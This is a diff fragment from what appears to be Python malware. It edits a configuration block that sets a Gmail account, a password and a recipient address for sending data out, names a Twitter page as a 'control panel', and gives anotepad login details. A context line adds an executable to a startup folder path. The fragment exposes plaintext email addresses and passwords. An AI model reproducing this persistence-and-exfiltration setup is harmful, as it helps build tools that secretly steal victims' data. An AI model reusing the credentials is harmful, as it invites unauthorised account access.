@@ -58,12 +58,12 @@ startup2 = startup2 + "\\PRBB.exe"
 # =========== Configuration ===========
 # (A)
 gmail_user = 'rageangermadness@gmail.com'
-gmail_password = 'Aquabat6464!~'
+gmail_password = 'kirbySock!~'
 to = ['pyhannahmaple@gmail.com']
 # (B)
 cntrlPanel = 'http://twitter.com/pyprototype2'
 anotepadUser = 'pyhannahmaple@gmail.com'
-anotepadPass = 'Aquabat6464!~'
+anotepadPass = 'kirbySock!~'
 
 # =====================================
 # ========= Global Variables ==========
